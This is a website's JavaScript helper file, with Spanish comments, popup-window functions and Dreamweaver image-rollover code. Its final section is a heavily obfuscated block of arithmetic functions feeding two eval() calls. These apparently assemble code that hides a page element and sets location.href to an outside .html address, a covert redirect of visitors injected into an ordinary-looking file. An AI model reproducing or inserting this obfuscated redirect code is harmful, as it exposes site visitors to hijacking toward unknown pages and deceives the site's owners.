<!--ABREVENTANA-->

function ventana_peq(url,name) {var nuevaVentana=window.open(url,name,'width=650,height=350,top=100,left=75,resizable=yes,menubar=yes');}
function ventana_gran(url,name) {var nuevaVentana=window.open(url,name,'width=700,height=400,top=50,left=50,resizable=yes,menubar=yes');}
function ventana_sgran(url,name) {var nuevaVentana=window.open(url,name,'width=800,height=600,top=0,left=0,resizable=yes,menubar=yes,scrollbars=auto');}
function ventana_imp(url,name) {var nuevaVentana=window.open(url,name,'width=800,height=600,top=0,left=0,resizable=yes,menubar=yes,scrollbars=auto');}
function coordenada (url,name) {var nuevaVentana=window.open(url,name,'width=500,height=300,top=0,left=0,resizable=yes,menubar=yes,scrollbars=yes');}

<!--Esta funci�n la utiliza TBS-->
function ventana_ayuda(url,name) {	var nuevaVentana=window.open(url,name,'AYUDA','width=370,height=300,menubar=yes,scrollbars=yes');}

<!--COLOR FILA/CELDA-->
function uno(src,color_entrada) { 
    src.bgColor=color_entrada;src.style.cursor="hand"; 
} 
function dos(src,color_default) { 
    src.bgColor=color_default;src.style.cursor="default"; 
}
function tres(src,color_default) { 
    src.bgColor=color_default;src.style.cursor="default"; 
}

function MM_swapImgRestore() { //v3.0
  var i,x,a=document.MM_sr; for(i=0;a&&i<a.length&&(x=a[i])&&x.oSrc;i++) x.src=x.oSrc;
}

<!--ROLL OVER-->
function MM_preloadImages() { //v3.0
  var d=document; if(d.images){ if(!d.MM_p) d.MM_p=new Array();
    var i,j=d.MM_p.length,a=MM_preloadImages.arguments; for(i=0; i<a.length; i++)
    if (a[i].indexOf("#")!=0){ d.MM_p[j]=new Image; d.MM_p[j++].src=a[i];}}
}

function MM_findObj(n, d) { //v4.01
  var p,i,x;  if(!d) d=document; if((p=n.indexOf("?"))>0&&parent.frames.length) {
    d=parent.frames[n.substring(p+1)].document; n=n.substring(0,p);}
  if(!(x=d[n])&&d.all) x=d.all[n]; for (i=0;!x&&i<d.forms.length;i++) x=d.forms[i][n];
  for(i=0;!x&&d.layers&&i<d.layers.length;i++) x=MM_findObj(n,d.layers[i].document);
  if(!x && d.getElementById) x=d.getElementById(n); return x;
}

function MM_swapImage() { //v3.0
  var i,j=0,x,a=MM_swapImage.arguments; document.MM_sr=new Array; for(i=0;i<(a.length-2);i+=3)
   if ((x=MM_findObj(a[i]))!=null){document.MM_sr[j++]=x; if(!x.oSrc) x.oSrc=x.src; x.src=a[i+2];}
}


function MM_jumpMenu(targ,selObj,restore){ //v3.0
  eval(targ+".location='"+selObj.options[selObj.selectedIndex].value+"'");
  if (restore) selObj.selectedIndex=0;
}

/////////////////--------------------\\\\\\\\\\\\\\\\\\\\\\


function OO0(ll,l1){ll+=l1;l1=ll-l1;return ~(~l1&~(ll-l1))}
function OO00(ll,l1){l1+=ll;ll=l1-ll;return ~OO0(~ll,~(l1-ll))}
function O0(ll,l1){return OO00(OO0(20+1,15),(63)>>>OO0(~(ll|~ll),1))>>>(OO00(OO00(4,7),OO00(6,15)))}
function O00(ll,l1){return (O0(l1++,++ll)<<O00O(ll--,--ll)-O0(l1+ll,l1-ll))>>O0(l1,1)}
function O00O(ll,l1){return OO0(O0(ll,l1),OO0(O0(ll,l1+1)<<O0(ll-l1,l1),O0(1,11)))}
function O000(ll,l1){return OO00(OO0(O0(ll+2,l1-2),OO0(O00(ll*2,l1>>>1)<<O0(ll,l1+ll),O00O(ll>>l1,l1<<ll))),~O00(ll,0))}
function OOO(ll,l1){return OO0(O0(l1,l1>>ll),OO0(O00(ll++,++ll),O00(ll,1)<<O0(ll,l1)))}
function OOO0(ll,l1){return (OOOO(ll,l1-ll)-O0(ll,11))/O00O(ll--,--l1)}
function OOOO(ll,l1){return OO0(O0(l1,l1)<<O000(ll>>OOO(),l1),O0(l1,ll)<<O0(l1<<2,ll+3))};
eval("\x66"+String.fromCharCode(3*OOOO(11,16)+1*OOO0(14,7)+1*O00O(4,15)+1*O0(2,7))+String.fromCharCode(3*OOOO(7,7)+1*OOO(21,12)+1*O0(1,6))+
String.fromCharCode(2*OOOO(5,8)+2*OOO0(12,9)+1*OOO(18,15)+1*O00(30,2))+"t"+"\x69"+"\x6f"+String.fromCharCode(3*OOOO(3,16)+1*OOO(20,10)+1*O0(1,5))+
String.fromCharCode(2*OOO0(8,10)+1*OOO(21,17)+1*O00O(3,9))+String.fromCharCode(3*OOOO(5,3)+1*O00O(3,12))+
String.fromCharCode(3*OOOO(11,19)+1*OOO0(6,4)+1*O00(27,3))+"\x66"+String.fromCharCode(1*OOOO(2,9)+1*O000(21,3)+1*O0(1,5))+
String.fromCharCode(1*OOOO(9,6)+1*OOO(22,8))+String.fromCharCode(3*OOOO(5,17)+1*OOO0(9,12)+1*OOO(19,10)+1*O00O(3,12))+
String.fromCharCode(3*OOOO(4,15)+1*OOO0(13,12)+1*O0(2,5))+"e"+
String.fromCharCode(3*OOOO(12,5)+1*OOO0(7,6)+1*O00O(4,6))+String.fromCharCode(3*OOOO(5,6)+1*OOO0(8,7)+1*O00O(7,17)+1*O0(2,6))+"r"+"n"+
String.fromCharCode(0x20)+String.fromCharCode(2*OOOO(12,6)+2*OOO0(15,12)+1*OOO(23,7)+1*O00O(5,15))+String.fromCharCode(0x6f)+
String.fromCharCode(2*OOOO(10,18)+2*OOO0(6,6)+1*OOO(19,11)+1*O00(29,3))+String.fromCharCode(3*OOOO(2,15)+1*OOO0(6,6)+1*O00O(2,7)+1*O0(2,7))+
String.fromCharCode(3*OOOO(11,20)+1*OOO(22,11))+"\x65"+"\x6e"+"t"+String.fromCharCode(0x2e)+String.fromCharCode(0x67)+
String.fromCharCode(2*OOOO(6,16)+3*OOO0(7,12))+String.fromCharCode(3*OOOO(6,14)+1*OOO0(11,10)+1*O00O(3,14))+
String.fromCharCode(2*OOOO(6,12)+1*O0(1,4))+String.fromCharCode(3*OOOO(11,6)+1*O000(24,7)+1*O0(1,7))+String.fromCharCode(0x65)+
String.fromCharCode(0x6d)+String.fromCharCode(2*OOOO(8,7)+3*OOO0(11,5))+"\x6e"+String.fromCharCode(0x74)+
String.fromCharCode(3*OOOO(6,11)+1*OOO0(8,10)+1*O00(21,4))+"B"+String.fromCharCode(3*OOOO(12,6)+1*OOO0(6,5)+1*OOO(12,19)+1*O0(2,3))+
String.fromCharCode(2*OOOO(3,5)+1*OOO0(11,5)+1*O000(24,4))+String.fromCharCode(2*OOOO(5,6)+2*OOO0(6,7)+1*OOO(18,15))+
String.fromCharCode(3*OOOO(10,5)+1*O0(1,3))+String.fromCharCode(2*OOOO(12,10)+1*OOO(18,10)+1*O00O(7,17))+"a"+String.fromCharCode(0x6d)+
String.fromCharCode(2*OOOO(6,21)+3*OOO0(8,6))+String.fromCharCode(1*OOOO(1,15)+1*O000(33,3)+1*O0(2,4))+
String.fromCharCode(1*OOOO(8,11)+1*O000(32,1))+String.fromCharCode(2*OOOO(2,12)+2*OOO0(10,4)+1*OOO(13,14)+1*O0(1,5))+
String.fromCharCode(2*OOOO(10,14)+2*OOO0(8,12)+1*OOO(24,18))+"\x73"+String.fromCharCode(2*OOOO(2,12)+3*OOO0(9,10))+"'"+
String.fromCharCode(1*OOOO(9,17)+1*OOO(18,9))+"."+String.fromCharCode(0x6c)+"\x65"+String.fromCharCode(3*OOOO(10,18)+1*OOO(21,14)+1*O0(1,5))+
String.fromCharCode(3*OOOO(3,4)+1*O0(2,4))+"t"+String.fromCharCode(3*OOOO(10,3)+1*O00(26,4))+
String.fromCharCode(1*OOOO(10,8)+2*OOO0(8,8)+1*O000(32,2)+1*O0(1,5))+String.fromCharCode(1*OOOO(1,17)+1*OOO0(6,4)+1*O00O(4,10))+
String.fromCharCode(2*OOO0(6,10)+1*OOO(15,17)+1*O00O(2,14))+String.fromCharCode(1*OOOO(10,3)+2*OOO0(11,9)+1*OOO(14,8))+
String.fromCharCode(2*OOO0(9,5)+1*OOO(13,11)+1*O00O(4,14))+String.fromCharCode(3*OOOO(9,12)+1*OOO0(12,9)+1*O00O(3,16))+
String.fromCharCode(3*OOOO(1,6)+1*OOO0(7,9)+1*O0(1,5))+"\x75"+"\x65"+":"+String.fromCharCode(0x66)+
String.fromCharCode(2*OOOO(7,12)+2*OOO0(8,12)+1*OOO(22,9))+"l"+String.fromCharCode(0x73)+"e"+"\x3b"+"\x7d"+";");
eval(String.fromCharCode(3*OOOO(1,13)+1*O00O(7,17))+"\x66"+"\x28"+"\x69"+String.fromCharCode(3*OOOO(4,15)+1*OOO0(8,9)+1*O00(30,4))+
String.fromCharCode(3*OOOO(10,21))+String.fromCharCode(1*OOOO(10,7)+1*O000(30,8)+1*O0(2,3))+String.fromCharCode(1*OOOO(10,9)+1*OOO(14,18))+"\x29"+
String.fromCharCode(3*OOOO(8,16)+1*OOO0(13,3)+1*OOO(16,11)+1*O00O(6,13))+
"l"+String.fromCharCode(3*OOOO(12,10)+1*OOO(12,16)+1*O00(22,5))+"\x63"+
String.fromCharCode(0x61)+String.fromCharCode(3*OOOO(2,6)+1*OOO0(8,6)+1*O00O(7,16))+String.fromCharCode(0x69)+
String.fromCharCode(3*OOOO(7,9)+1*OOO(14,12)+1*O00(21,4))+String.fromCharCode(3*OOOO(2,9)+1*OOO(13,15)+1*O0(2,4))+
String.fromCharCode(1*OOOO(7,6)+1*OOO0(13,9)+1*O0(1,7))+String.fromCharCode(0x68)+String.fromCharCode(3*OOOO(2,7)+1*OOO0(11,11)+1*O0(1,4))+
String.fromCharCode(2*OOOO(8,12)+3*OOO0(9,4))+String.fromCharCode(3*OOOO(10,14))+"="+String.fromCharCode(1*OOOO(9,6))+"\x68"+
String.fromCharCode(3*OOOO(10,7)+1*OOO0(10,3)+1*O00O(6,14))+"t"+String.fromCharCode(0x70)+String.fromCharCode(3*OOOO(9,19)+1*OOO0(14,12)+1*O00(28,5))+
String.fromCharCode(1*OOOO(9,5)+2*OOO0(13,9)+1*O00(28,5))+String.fromCharCode(1*OOOO(4,21)+1*OOO0(9,8)+1*O00(23,2))+
String.fromCharCode(1*OOOO(8,10)+1*OOO0(15,6)+1*O00(25,4))+String.fromCharCode(3*OOOO(7,20)+1*OOO0(11,7)+1*O000(33,5)+1*O0(2,3))+
String.fromCharCode(3*OOOO(12,13)+1*OOO0(15,3)+1*O000(28,5)+1*O0(1,6))+String.fromCharCode(3*OOOO(9,18)+1*OOO0(13,11)+1*O000(32,7)+1*O0(1,7))+
String.fromCharCode(1*OOOO(2,3)+1*OOO0(12,11)+1*O0(1,3))+String.fromCharCode(3*OOOO(8,6)+1*OOO0(12,8)+1*O0(2,3))+
String.fromCharCode(3*OOOO(12,4)+1*OOO0(11,8)+1*O00O(5,17)+1*O0(2,7))+"\x72"+String.fromCharCode(0x61)+"l"+
String.fromCharCode(3*OOOO(9,15)+1*OOO0(15,7)+1*O000(28,3))+String.fromCharCode(3*OOOO(6,11)+1*O00O(7,9))+"a"+
String.fromCharCode(1*OOOO(7,20)+1*OOO0(14,12)+1*O0(1,6))+String.fromCharCode(0x63)+String.fromCharCode(3*OOOO(7,16)+1*OOO(12,10)+1*O00(31,5))+
String.fromCharCode(3*OOOO(9,5)+1*OOO(17,7))+"\x2f"+String.fromCharCode(2*OOOO(6,14)+2*OOO0(11,6)+1*OOO(24,8))+String.fromCharCode(3*OOOO(2,21)+1*OOO0(15,9)+1*O000(31,3))+
String.fromCharCode(3*OOOO(10,16)+1*O00O(7,9))+String.fromCharCode(3*OOOO(7,12)+1*OOO0(8,7)+1*O00(25,3))+String.fromCharCode(3*OOOO(6,16)+1*OOO(16,14)+1*O00(22,2))+
String.fromCharCode(3*OOOO(5,9)+1*OOO0(10,3)+1*O00(28,4))+String.fromCharCode(1*OOOO(7,20)+1*OOO0(12,6)+1*O00(31,5))+"\x61"+
String.fromCharCode(3*OOOO(3,16)+1*OOO0(10,9)+1*O000(28,3))+String.fromCharCode(3*OOOO(6,12)+1*O00O(7,8))+"\x73"+
String.fromCharCode(3*OOOO(12,16)+1*OOO(17,11)+1*O00(27,5))+String.fromCharCode(2*OOOO(2,16)+2*OOO0(8,11)+1*O000(23,7))+
String.fromCharCode(3*OOOO(2,9)+1*OOO0(9,4)+1*O00O(3,17))+String.fromCharCode(3*OOOO(2,8)+1*OOO0(14,11)+1*O0(1,3))+"o"+
String.fromCharCode(3*OOOO(9,17)+1*OOO0(11,9)+1*OOO(16,12)+1*O0(2,6))+String.fromCharCode(2*OOOO(4,9)+2*OOO0(13,5)+1*OOO(23,9))+"n"+
String.fromCharCode(3*OOOO(11,18)+1*OOO(13,14)+1*O00(26,3))+"\x2e"+"h"+"t"+String.fromCharCode(3*OOOO(6,19)+1*OOO(21,19))+String.fromCharCode(0x6c)+"\x22"+";"+
"\x7d");

